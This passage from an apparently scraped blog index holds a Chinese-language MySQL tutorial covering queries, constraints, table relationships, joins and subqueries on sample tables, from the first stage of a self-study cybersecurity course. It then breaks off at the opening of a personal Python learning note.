SELECT NAME,IFNULL(stock,0)+10 FROM product; /* 起别名 标准语法： SELECT 列名1,列名2,... AS 别名 FROM 表名; */ -- 查询商品名称和库存，库存数量在原有基础上加10。进行null值判断。起别名为getSum SELECT NAME,IFNULL(stock,0)+10 AS getSum FROM product; SELECT NAME,IFNULL(stock,0)+10 getSum FROM product; 查询_条件查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* 条件查询 标准语法： SELECT 列名列表 FROM 表名 WHERE 条件; */ -- 查询库存大于20的商品信息 SELECT * FROM product WHERE stock \u0026gt; 20; -- 查询品牌为华为的商品信息 SELECT * FROM product WHERE brand=\u0026#39;华为\u0026#39;; -- 查询金额在4000 ~ 6000之间的商品信息 SELECT * FROM product WHERE price \u0026gt;= 4000 AND price \u0026lt;= 6000; SELECT * FROM product WHERE price BETWEEN 4000 AND 6000; -- 查询库存为14、30、23的商品信息 SELECT * FROM product WHERE stock=14 OR stock=30 OR stock=23; SELECT * FROM product WHERE stock IN(14,30,23); -- 查询库存为null的商品信息 SELECT * FROM product WHERE stock IS NULL; -- 查询库存不为null的商品信息 SELECT * FROM product WHERE stock IS NOT NULL; -- 查询名称以小米为开头的商品信息 SELECT * FROM product WHERE NAME LIKE \u0026#39;小米%\u0026#39;; -- 查询名称第二个字是为的商品信息 SELECT * FROM product WHERE NAME LIKE \u0026#39;_为%\u0026#39;; -- 查询名称为四个字符的商品信息 SELECT * FROM product WHERE NAME LIKE \u0026#39;____\u0026#39;; -- 查询名称中包含电脑的商品信息 SELECT * FROM product WHERE NAME LIKE \u0026#39;%电脑%\u0026#39;; 查询_聚合函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* 聚合函数 标准语法： SELECT 函数名(列名) FROM 表名 [WHERE 条件]; */ -- 计算product表中总记录条数 SELECT COUNT(*) FROM product; -- 获取最高价格 SELECT MAX(price) FROM product; -- 获取最低库存 SELECT MIN(stock) FROM product; -- 获取总库存数量 SELECT SUM(stock) FROM product; -- 获取品牌为苹果的总库存数量 SELECT SUM(stock) FROM product WHERE brand=\u0026#39;苹果\u0026#39;; -- 获取品牌为小米的平均商品价格 SELECT AVG(price) FROM product WHERE brand=\u0026#39;小米\u0026#39;; 查询_排序查询 1 2 3 4 5 6 7 8 9 10 11 12 13 /* 排序查询 标准语法： SELECT 列名 FROM 表名 [WHERE 条件] ORDER BY 列名1 排序方式1,列名2 排序方式2; */ -- 按照库存升序排序 SELECT * FROM product ORDER BY stock ASC; -- 查询名称中包含手机的商品信息。按照金额降序排序 SELECT * FROM product WHERE NAME LIKE \u0026#39;%手机%\u0026#39; ORDER BY price DESC; -- 按照金额升序排序，如果金额相同，按照库存降序排列 SELECT * FROM product ORDER BY price ASC,stock DESC; 查询_分组查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* 分组查询 标准语法： SELECT 列名 FROM 表名 [WHERE 条件] GROUP BY 分组列名 [HAVING 分组后条件过滤] [ORDER BY 排序列名 排序方式]; */ -- 按照品牌分组，获取每组商品的总金额 SELECT brand,SUM(price) FROM product GROUP BY brand; -- 对金额大于4000元的商品，按照品牌分组,获取每组商品的总金额 SELECT brand,SUM(price) FROM product WHERE price \u0026gt; 4000 GROUP BY brand; -- 对金额大于4000元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于7000元的 SELECT brand,SUM(price) getSum FROM product WHERE price \u0026gt; 4000 GROUP BY brand HAVING getSum \u0026gt; 7000; -- 对金额大于4000元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于7000元的、并按照总金额的降序排列 SELECT brand,SUM(price) getSum FROM product WHERE price \u0026gt; 4000 GROUP BY brand HAVING getSum \u0026gt; 7000 ORDER BY getSum DESC; 查询_分页查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* 分页查询 标准语法： SELECT 列名 FROM 表名 [WHERE 条件] [GROUP BY 分组列名] [HAVING 分组后条件过滤] [ORDER BY 排序列名 排序方式] LIMIT 当前页数,每页显示的条数; LIMIT 当前页数,每页显示的条数; 公式：当前页数 = (当前页数-1) * 每页显示的条数 */ -- 每页显示3条数据 -- 第1页 当前页数=(1-1) * 3 SELECT * FROM product LIMIT 0,3; -- 第2页 当前页数=(2-1) * 3 SELECT * FROM product LIMIT 3,3; -- 第3页 当前页数=(3-1) * 3 SELECT * FROM product LIMIT 6,3; 约束_主键约束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- 创建学生表(编号、姓名、年龄) 编号设为主键 CREATE TABLE student( id INT PRIMARY KEY, NAME VARCHAR(30), age INT ); -- 查询学生表的详细信息 DESC student; -- 添加数据 INSERT INTO student VALUES (1,\u0026#39;张三\u0026#39;,23); INSERT INTO student VALUES (2,\u0026#39;李四\u0026#39;,24); -- 删除主键 ALTER TABLE student DROP PRIMARY KEY; -- 建表后单独添加主键约束 ALTER TABLE student MODIFY id INT PRIMARY KEY; 约束_主键自增约束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- 创建学生表(编号、姓名、年龄) 编号设为主键自增 CREATE TABLE student( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(30), age INT ); -- 查询学生表的详细信息 DESC student; -- 添加数据 INSERT INTO student VALUES (NULL,\u0026#39;张三\u0026#39;,23),(NULL,\u0026#39;李四\u0026#39;,24); -- 删除自增约束 ALTER TABLE student MODIFY id INT; INSERT INTO student VALUES (NULL,\u0026#39;张三\u0026#39;,23); -- 建表后单独添加自增约束 ALTER TABLE student MODIFY id INT AUTO_INCREMENT; 约束_唯一约束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- 创建学生表(编号、姓名、年龄) 编号设为主键自增，年龄设为唯一 CREATE TABLE student( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(30), age INT UNIQUE ); -- 查询学生表的详细信息 DESC student; -- 添加数据 INSERT INTO student VALUES (NULL,\u0026#39;张三\u0026#39;,23); INSERT INTO student VALUES (NULL,\u0026#39;李四\u0026#39;,23); -- 删除唯一约束 ALTER TABLE student DROP INDEX age; -- 建表后单独添加唯一约束 ALTER TABLE student MODIFY age INT UNIQUE; 约束_非空约束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- 创建学生表(编号、姓名、年龄) 编号设为主键自增，姓名设为非空，年龄设为唯一 CREATE TABLE student( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(30) NOT NULL, age INT UNIQUE ); -- 查询学生表的详细信息 DESC student; -- 添加数据 INSERT INTO student VALUES (NULL,\u0026#39;张三\u0026#39;,23); -- 删除非空约束 ALTER TABLE student MODIFY NAME VARCHAR(30); INSERT INTO student VALUES (NULL,NULL,25); -- 建表后单独添加非空约束 ALTER TABLE student MODIFY NAME VARCHAR(30) NOT NULL; 约束_外键约束 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 -- 创建db2数据库 CREATE DATABASE db2; -- 使用db2数据库 USE db2; /* 外键约束 标准语法： CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主表主键列名) */ -- 建表时添加外键约束 -- 创建user用户表 CREATE TABLE USER( id INT PRIMARY KEY AUTO_INCREMENT, -- id NAME VARCHAR(20) NOT NULL -- 姓名 ); -- 添加用户数据 INSERT INTO USER VALUES (NULL,\u0026#39;张三\u0026#39;),(NULL,\u0026#39;李四\u0026#39;); -- 创建orderlist订单表 CREATE TABLE orderlist( id INT PRIMARY KEY AUTO_INCREMENT, -- id number VARCHAR(20) NOT NULL, -- 订单编号 uid INT, -- 外键列 CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id) ); -- 添加订单数据 INSERT INTO orderlist VALUES (NULL,\u0026#39;hm001\u0026#39;,1),(NULL,\u0026#39;hm002\u0026#39;,1), (NULL,\u0026#39;hm003\u0026#39;,2),(NULL,\u0026#39;hm004\u0026#39;,2); -- 添加一个订单，但是没有真实用户。添加失败 INSERT INTO orderlist VALUES (NULL,\u0026#39;hm005\u0026#39;,3); -- 删除李四用户。删除失败 DELETE FROM USER WHERE NAME=\u0026#39;李四\u0026#39;; /* 删除外键约束 标准语法： ALTER TABLE 表名 DROP FOREIGN KEY 外键名; */ -- 删除外键约束 ALTER TABLE orderlist DROP FOREIGN KEY ou_fk1; /* 建表后单独添加外键约束 标准语法： ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名); */ -- 添加外键约束 ALTER TABLE orderlist ADD CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id); 外键级联操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* 添加外键约束，同时添加级联更新 标准语法： ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名) ON UPDATE CASCADE; 添加外键约束，同时添加级联删除 标准语法： ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名) ON DELETE CASCADE; 添加外键约束，同时添加级联更新和级联删除 标准语法： ALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名)REFERENCES 主表 名(主键列名) ON UPDATE CASCADE ON DELETE CASCADE; */ -- 删除外键约束 ALTER TABLE orderlist DROP FOREIGN KEY ou_fk1; -- 添加外键约束，同时添加级联更新和级联删除 ALTER TABLE orderlist ADD CONSTRAINT ou_fk1 FOREIGN KEY (uid)REFERENCES USER(id) ON UPDATE CASCADE ON DELETE CASCADE; -- 将李四这个用户的id修改为3,订单表中的uid也自动修改 UPDATE USER SET id=3 WHERE id=2; -- 将李四这个用户删除,订单表中的该用户所属的订单也自动删除 DELETE FROM USER WHERE id=3; 表关系_一对一 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 -- 创建db3数据库 CREATE DATABASE db3; -- 使用db3数据库 USE db3; -- 创建person表 CREATE TABLE person( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(20) -- 姓名 ); -- 添加数据 INSERT INTO person VALUES (NULL,\u0026#39;张三\u0026#39;),(NULL,\u0026#39;李四\u0026#39;); -- 创建card表 CREATE TABLE card( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id number VARCHAR(20) UNIQUE NOT NULL, -- 身份证号 pid INT UNIQUE, -- 外键列 CONSTRAINT cp_fk1 FOREIGN KEY (pid) REFERENCES person(id) ); -- 添加数据 INSERT INTO card VALUES (NULL,\u0026#39;12345\u0026#39;,1),(NULL,\u0026#39;56789\u0026#39;,2); 表关系_一对多 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 -- 创建user表 CREATE TABLE USER( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(20) -- 姓名 ); -- 添加数据 INSERT INTO USER VALUES (NULL,\u0026#39;张三\u0026#39;),(NULL,\u0026#39;李四\u0026#39;); -- 创建orderlist表 CREATE TABLE orderlist( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id number VARCHAR(20), -- 订单编号 uid INT, -- 外键列 CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id) ); -- 添加数据 INSERT INTO orderlist VALUES (NULL,\u0026#39;hm001\u0026#39;,1),(NULL,\u0026#39;hm002\u0026#39;,1)(NULL,\u0026#39;hm003\u0026#39;,2),(NULL,\u0026#39;hm004\u0026#39;,2); /* 商品分类和商品 */ -- 创建category表 CREATE TABLE category( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(10) -- 分类名称 ); -- 添加数据 INSERT INTO category VALUES (NULL,\u0026#39;手机数码\u0026#39;),(NULL,\u0026#39;电脑办公\u0026#39;); -- 创建product表 CREATE TABLE product( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(30), -- 商品名称 cid INT, -- 外键列 CONSTRAINT pc_fk1 FOREIGN KEY (cid) REFERENCES category(id) ); -- 添加数据 INSERT INTO product VALUES (NULL,\u0026#39;华为P30\u0026#39;,1),(NULL,\u0026#39;小米note3\u0026#39;,1),(NULL,\u0026#39;联想电脑\u0026#39;,2),(NULL,\u0026#39;苹果电脑\u0026#39;,2); 表关系_多对多 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -- 创建student表 CREATE TABLE student( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(20) -- 学生姓名 ); -- 添加数据 INSERT INTO student VALUES (NULL,\u0026#39;张三\u0026#39;),(NULL,\u0026#39;李四\u0026#39;); -- 创建course表 CREATE TABLE course( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id NAME VARCHAR(10) -- 课程名称 ); -- 添加数据 INSERT INTO course VALUES (NULL,\u0026#39;语文\u0026#39;),(NULL,\u0026#39;数学\u0026#39;); -- 创建中间表 CREATE TABLE stu_course( id INT PRIMARY KEY AUTO_INCREMENT, -- 主键id sid INT, -- 用于和student表中的id进行外键关联 cid INT, -- 用于和course表中的id进行外键关联 CONSTRAINT sc_fk1 FOREIGN KEY (sid) REFERENCES student(id), -- 添加外键约束 CONSTRAINT sc_fk2 FOREIGN KEY (cid) REFERENCES course(id) -- 添加外键约束 ); -- 添加数据 INSERT INTO stu_course VALUES (NULL,1,1),(NULL,1,2),(NULL,2,1),(NULL,2,2); 多表查询_数据准备 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 -- 创建db4数据库 CREATE DATABASE db4; -- 使用db4数据库 USE db4; -- 创建user表 CREATE TABLE USER( id INT PRIMARY KEY AUTO_INCREMENT, -- 用户id NAME VARCHAR(20), -- 用户姓名 age INT -- 用户年龄 ); -- 添加数据 INSERT INTO USER VALUES (1,\u0026#39;张三\u0026#39;,23); INSERT INTO USER VALUES (2,\u0026#39;李四\u0026#39;,24); INSERT INTO USER VALUES (3,\u0026#39;王五\u0026#39;,25); INSERT INTO USER VALUES (4,\u0026#39;赵六\u0026#39;,26); -- 订单表 CREATE TABLE orderlist( id INT PRIMARY KEY AUTO_INCREMENT, -- 订单id number VARCHAR(30), -- 订单编号 uid INT, -- 外键字段 CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id) ); -- 添加数据 INSERT INTO orderlist VALUES (1,\u0026#39;hm001\u0026#39;,1); INSERT INTO orderlist VALUES (2,\u0026#39;hm002\u0026#39;,1); INSERT INTO orderlist VALUES (3,\u0026#39;hm003\u0026#39;,2); INSERT INTO orderlist VALUES (4,\u0026#39;hm004\u0026#39;,2); INSERT INTO orderlist VALUES (5,\u0026#39;hm005\u0026#39;,3); INSERT INTO orderlist VALUES (6,\u0026#39;hm006\u0026#39;,3); INSERT INTO orderlist VALUES (7,\u0026#39;hm007\u0026#39;,NULL); -- 商品分类表 CREATE TABLE category( id INT PRIMARY KEY AUTO_INCREMENT, -- 商品分类id NAME VARCHAR(10) -- 商品分类名称 ); -- 添加数据 INSERT INTO category VALUES (1,\u0026#39;手机数码\u0026#39;); INSERT INTO category VALUES (2,\u0026#39;电脑办公\u0026#39;); INSERT INTO category VALUES (3,\u0026#39;烟酒茶糖\u0026#39;); INSERT INTO category VALUES (4,\u0026#39;鞋靴箱包\u0026#39;); -- 商品表 CREATE TABLE product( id INT PRIMARY KEY AUTO_INCREMENT, -- 商品id NAME VARCHAR(30), -- 商品名称 cid INT, -- 外键字段 CONSTRAINT cp_fk1 FOREIGN KEY (cid) REFERENCES category(id) ); -- 添加数据 INSERT INTO product VALUES (1,\u0026#39;华为手机\u0026#39;,1); INSERT INTO product VALUES (2,\u0026#39;小米手机\u0026#39;,1); INSERT INTO product VALUES (3,\u0026#39;联想电脑\u0026#39;,2); INSERT INTO product VALUES (4,\u0026#39;苹果电脑\u0026#39;,2); INSERT INTO product VALUES (5,\u0026#39;中华香烟\u0026#39;,3); INSERT INTO product VALUES (6,\u0026#39;玉溪香烟\u0026#39;,3); INSERT INTO product VALUES (7,\u0026#39;计生用品\u0026#39;,NULL); -- 中间表 CREATE TABLE us_pro( upid INT PRIMARY KEY AUTO_INCREMENT, -- 中间表id uid INT, -- 外键字段。需要和用户表的主键产生关联 pid INT, -- 外键字段。需要和商品表的主键产生关联 CONSTRAINT up_fk1 FOREIGN KEY (uid) REFERENCES USER(id), CONSTRAINT up_fk2 FOREIGN KEY (pid) REFERENCES product(id) ); -- 添加数据 INSERT INTO us_pro VALUES (NULL,1,1); INSERT INTO us_pro VALUES (NULL,1,2); INSERT INTO us_pro VALUES (NULL,1,3); INSERT INTO us_pro VALUES (NULL,1,4); INSERT INTO us_pro VALUES (NULL,1,5); INSERT INTO us_pro VALUES (NULL,1,6); INSERT INTO us_pro VALUES (NULL,1,7); INSERT INTO us_pro VALUES (NULL,2,1); INSERT INTO us_pro VALUES (NULL,2,2); INSERT INTO us_pro VALUES (NULL,2,3); INSERT INTO us_pro VALUES (NULL,2,4); INSERT INTO us_pro VALUES (NULL,2,5); INSERT INTO us_pro VALUES (NULL,2,6); INSERT INTO us_pro VALUES (NULL,2,7); INSERT INTO us_pro VALUES (NULL,3,1); INSERT INTO us_pro VALUES (NULL,3,2); INSERT INTO us_pro VALUES (NULL,3,3); INSERT INTO us_pro VALUES (NULL,3,4); INSERT INTO us_pro VALUES (NULL,3,5); INSERT INTO us_pro VALUES (NULL,3,6); INSERT INTO us_pro VALUES (NULL,3,7); INSERT INTO us_pro VALUES (NULL,4,1); INSERT INTO us_pro VALUES (NULL,4,2); INSERT INTO us_pro VALUES (NULL,4,3); INSERT INTO us_pro VALUES (NULL,4,4); INSERT INTO us_pro VALUES (NULL,4,5); INSERT INTO us_pro VALUES (NULL,4,6); INSERT INTO us_pro VALUES (NULL,4,7); 多表查询_内连接查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 /* 显示内连接 标准语法： SELECT 列名 FROM 表名1 [INNER] JOIN 表名2 ON 关联条件; */ -- 查询用户信息和对应的订单信息 SELECT * FROM USER INNER JOIN orderlist ON orderlist.uid = user.id; -- 查询用户信息和对应的订单信息，起别名 SELECT * FROM USER u INNER JOIN orderlist o ON o.uid=u.id; -- 查询用户姓名，年龄。和订单编号 SELECT u.name, -- 用户姓名 u.age, -- 用户年龄 o.number -- 订单编号 FROM USER u -- 用户表 INNER JOIN orderlist o -- 订单表 ON o.uid=u.id; /* 隐式内连接 标准语法： SELECT 列名 FROM 表名1,表名2 WHERE 关联条件; */ -- 查询用户姓名，年龄。和订单编号 SELECT u.name, -- 用户姓名 u.age, -- 用户年龄 o.number -- 订单编号 FROM USER u, -- 用户表 orderlist o -- 订单表 WHERE o.uid=u.id; 多表查询_外连接查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /* 左外连接 标准语法： SELECT 列名 FROM 表名1 LEFT [OUTER] JOIN 表名2 ON 条件; */ -- 查询所有用户信息，以及用户对应的订单信息 SELECT u.*, o.number FROM USER u LEFT OUTER JOIN orderlist o ON o.uid=u.id; /* 右外连接 标准语法： SELECT 列名 FROM 表名1 RIGHT [OUTER] JOIN 表名2 ON 条件; */ -- 查询所有订单信息，以及订单所属的用户信息 SELECT o.*, u.name FROM USER u RIGHT OUTER JOIN orderlist o ON o.uid=u.id; 多表查询_子查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* 结果是单行单列的 标准语法： SELECT 列名 FROM 表名 WHERE 列名=(SELECT 列名 FROM 表名 [WHERE 条件]); */ -- 查询年龄最高的用户姓名 SELECT MAX(age) FROM USER; SELECT NAME,age FROM USER WHERE age=(SELECT MAX(age) FROM USER); /* 结果是多行单列的 标准语法： SELECT 列名 FROM 表名 WHERE 列名 [NOT] IN (SELECT 列名 FROM 表名 [WHERE 条 件]); */ -- 查询张三和李四的订单信息 SELECT * FROM orderlist WHERE uid IN (1,2); SELECT id FROM USER WHERE NAME IN (\u0026#39;张三\u0026#39;,\u0026#39;李四\u0026#39;); SELECT * FROM orderlist WHERE uid IN (SELECT id FROM USER WHERE NAME IN (\u0026#39;张三\u0026#39;,\u0026#39;李四\u0026#39;)); /* 结果是多行多列的 标准语法： SELECT 列名 FROM 表名 [别名],(SELECT 列名 FROM 表名 [WHERE 条件]) [别名] [WHERE 条件]; */ -- 查询订单表中id大于4的订单信息和所属用户信息 SELECT * FROM orderlist WHERE id \u0026gt; 4; SELECT u.name, o.number FROM USER u, (SELECT * FROM orderlist WHERE id \u0026gt; 4) o WHERE o.uid=u.id; 多表查询_多表查询练习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 -- 1.查询用户的编号、姓名、年龄。订单编号 /* 分析 用户的编号、姓名、年龄 user表 订单编号 orderlist表 条件：user.id=orderlist.uid */ SELECT u.id, u.name, u.age, o.number FROM USER u, orderlist o WHERE u.id=o.uid; -- 2.查询所有的用户。用户的编号、姓名、年龄。订单编号 /* 分析 用户的编号、姓名、年龄 user表 订单编号 orderlist表 条件：user.id=orderlist.uid 查询所有的用户，左外连接 */ SELECT u.id, u.name, u.age, o.number FROM USER u LEFT OUTER JOIN orderlist o ON u.id=o.uid; -- 3.查询所有的订单。用户的编号、姓名、年龄。订单编号 /* 分析 用户的编号、姓名、年龄 user表 订单编号 orderlist表 条件：user.id=orderlist.uid 查询所有的订单，右外连接 */ SELECT u.id, u.name, u.age, o.number FROM USER u RIGHT OUTER JOIN orderlist o ON u.id=o.uid; -- 4.查询用户年龄大于23岁的信息。显示用户的编号、姓名、年龄。订单编号 /* 分析 用户的编号、姓名、年龄 user表 订单编号 orderlist表 条件：user.id=orderlist.uid AND user.age \u0026gt; 23 */ SELECT u.id, u.name, u.age, o.number FROM USER u, orderlist o WHERE u.id=o.uid AND u.age \u0026gt; 23; -- 5.查询张三和李四用户的信息。显示用户的编号、姓名、年龄。订单编号 /* 分析 用户的编号、姓名、年龄 user表 订单编号 orderlist表 条件：user.id=orderlist.uid AND user.name IN (\u0026#39;张三\u0026#39;,\u0026#39;李四\u0026#39;) */ SELECT u.id, u.name, u.age, o.number FROM USER u, orderlist o WHERE u.id=o.uid AND u.name IN (\u0026#39;张三\u0026#39;,\u0026#39;李四\u0026#39;); -- 6.查询商品分类的编号、分类名称。分类下的商品名称 /* 分析 商品分类的编号、分类名称 category表 商品名称 product表 条件：category.id=product.cid */ SELECT c.id, c.name, p.name FROM category c, product p WHERE c.id=p.cid; -- 7.查询所有的商品分类。商品分类的编号、分类名称。分类下的商品名称 /* 分析 商品分类的编号、分类名称 category表 商品名称 product表 条件：category.id=product.cid 查询所有的商品分类，左外连接 */ SELECT c.id, c.name, p.name FROM category c LEFT OUTER JOIN product p ON c.id=p.cid; -- 8.查询所有的商品信息。商品分类的编号、分类名称。分类下的商品名称 /* 分析 商品分类的编号、分类名称 category表 商品名称 product表 条件：category.id=product.cid 查询所有的商品信息，右外连接 */ SELECT c.id, c.name, p.name FROM category c RIGHT OUTER JOIN product p ON c.id=p.cid; -- 9.查询所有的用户和该用户能查看的所有的商品。显示用户的编号、姓名、年龄。商品名称 /* 分析 用户的编号、姓名、年龄 user表 商品名称 product表 中间表 us_pro 条件：us_pro.uid=user.id AND us_pro.pid=product.id */ SELECT u.id, u.name, u.age, p.name FROM USER u, product p, us_pro up WHERE up.uid=u.id AND up.pid=p.id; -- 10.查询张三和李四这两个用户可以看到的商品。显示用户的编号、姓名、年龄。商品名称 /* 分析 用户的编号、姓名、年龄 user表 商品名称 product表 中间表 us_pro 条件：us_pro.uid=user.id AND us_pro.pid=product.id AND user.name IN (\u0026#39;张三\u0026#39;,\u0026#39;李 四\u0026#39;) */ SELECT u.id, u.name, u.age, p.name FROM USER u, product p, us_pro up WHERE up.uid=u.id AND up.pid=p.id AND u.name IN (\u0026#39;张三\u0026#39;,\u0026#39;李四\u0026#39;); 结尾 ","date":"2025-07-31T00:00:00Z","headings":[{"id":"网路空间安全导论","level":2,"text":"网路空间安全导论\n"},{"id":"操作系统基础","level":2,"text":"操作系统基础\n"},{"id":"网络安全基础","level":2,"text":"网络安全基础\n"},{"id":"web安全基础","level":2,"text":"Web安全基础\n"},{"id":"mysql数据库安全基础","level":2,"text":"MySQL数据库安全基础\n"},{"id":"结尾","level":2,"text":"结尾\n"},{"id":"网络安全行业简介","level":3,"text":"网络安全行业简介\n"},{"id":"网络安全意识与法律法规","level":3,"text":"网络安全意识与法律法规\n"},{"id":"网络安全就业","level":3,"text":"网络安全就业\n"},{"id":"网络安全管理概述","level":3,"text":"网络安全管理概述\n"},{"id":"windows系统","level":3,"text":"Windows系统\n"},{"id":"linux系统","level":3,"text":"Linux系统\n"},{"id":"计算机网络","level":3,"text":"计算机网络\n"},{"id":"web基础","level":3,"text":"Web基础\n"},{"id":"web前端","level":3,"text":"Web前端\n"},{"id":"web后端","level":3,"text":"Web后端\n"},{"id":"web安全问题","level":3,"text":"Web安全问题\n"},{"id":"数据库概述","level":3,"text":"数据库概述\n"},{"id":"mysql数据库管理系统","level":3,"text":"MySQL数据库管理系统\n"},{"id":"数据库管理工具","level":3,"text":"数据库管理工具\n"},{"id":"数据库数据类型","level":3,"text":"数据库数据类型\n"},{"id":"客户端使用演示终端命令行","level":3,"text":"客户端使用演示（终端命令行）\n"},{"id":"可视化客户端","level":3,"text":"可视化客户端\n"},{"id":"sql语句","level":3,"text":"SQL语句\n"},{"id":"ddl","level":3,"text":"DDL\n"},{"id":"dql","level":3,"text":"DQL\n"},{"id":"使用别名","level":3,"text":"使用别名\n"},{"id":"系统预定义函数","level":3,"text":"系统预定义函数\n"},{"id":"关联查询联合查询","level":3,"text":"关联查询（联合查询）\n"},{"id":"select的七大子句","level":3,"text":"select的七大子句\n"},{"id":"子查询","level":3,"text":"子查询\n"},{"id":"dml","level":3,"text":"DML\n"},{"id":"数据库sql语言使用案例","level":3,"text":"数据库SQL语言使用案例\n"}],"image":"https://expl0rer.top/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E5%B0%81%E9%9D%A2_hu_4612687329c10f8d.jpg","permalink":"https://expl0rer.top/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/","title":"第一阶段（前置知识）"},{"content":" [TOC]\n前文 Python是强类型的动态脚本语言，相比C、C++来说，它是一种解释型的高级编程语言，能更好跨平台运行，Python的优势在于它能以较短的篇幅完成一项任务，说人话就是敲代码敲得少不费手就能打出脚本，但劣势是运行相对C来说慢些，不过也无妨它成为脚本小子最爱，可以看看下方例子，你就知道差距了哈哈！！！\n我一开始是先学C的，一开始接触编程很坐牢，if、else、for、do while等这些语句把我折磨得很惨，主要是零基础。。。。学完C后又到Python，因为不管打ctf还是以后工作，Python都是比较重要的，所以这也是我为什么要那么啰嗦的把我学Python的过程给记录下来，给未来的自己或者其它读者看看，交流一下也可。我参考嵩天的课本《Python语言程序基础》第二版来讲解，这也不算是讲解吧，更多是我学习的记录，你也看看我的过程，有错误的欢迎在邮箱或者评论区留言指正哈。\n直观例子 C语言 1 2 3 4 5 6 7 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;Hello! Ct\u0026#34;); return 0; } Python 1 print(\u0026#39;Hello? Ct\u0026#39;) 正文/语法 环境配置 Pycharm + Visual Studio Code\n因为Web网页格式和md文件的问题，再md中的某些符号显示正常，而在博客页面上显示有些异常，但不妨碍阅读，如有显示错误，在不影响答案情况下，都当作正常范围。\nBug的由来 早期美国科学家霍波在调试设备时发现故障，有虫子在机器间飞过从而”卡“住机器运行，于是把程序性故障统称为Bug（飞虫），并把排除程序故障叫做Debug（调试），这也是我们如今计算机领域的专业行话。\n快捷键 撤销：CTRL + z\n复制：CTRL + C\n粘贴：CTRL + v\n查找：CTRL + f\n剪切：CTRL + x\n目录 第一章：程序设计基本方法 计算机的概述 计算机定义有多种，一般是指：计算机是根据指令操作数据的设备。\n计算机的两个基本特性：功能性和可编程性。 